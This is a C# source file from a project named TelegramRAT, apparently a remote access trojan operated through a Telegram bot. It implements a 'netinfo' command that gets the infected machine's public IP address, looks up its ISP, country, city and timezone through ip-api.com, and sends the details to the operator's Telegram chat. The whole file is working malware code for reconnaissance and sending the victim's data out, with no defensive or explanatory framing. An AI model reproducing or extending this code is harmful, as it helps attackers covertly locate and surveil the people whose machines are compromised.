using Telegram.Bot;
using TelegramRAT.Services;
using TelegramRAT.Utilities;
using TelegramRAT.Features;

namespace TelegramRAT.Commands.Misc;

public class NetInfoCommand(ITelegramBotClient botClient, IBotNotificationService notificationService, INetworkService networkService) : AbstractBotCommand
{
    public override string Command => "netinfo";
    public override string Description => "Show info about internet connection";
    public override int ArgsCount => 0;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            var ipAddress = await networkService.GetIpAddressAsync();
            var networkInfo = await networkService.GetFromJsonAsync<NetworkInfo>("http://ip-api.com/json/" + ipAddress);

            string networkInformationString = "Network information:\n\n" +
            $"IP: {ipAddress}\n" +
            $"ISP: {networkInfo.Isp}\n" +
            $"Country: {networkInfo.Country}\n" +
            $"City: {networkInfo.City}\n" +
            $"Timezone: {networkInfo.Timezone}\n" +
            $"Country Code: {networkInfo.CountryCode}";

            await botClient.SendMessage(model.Message.Chat.Id, networkInformationString);
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
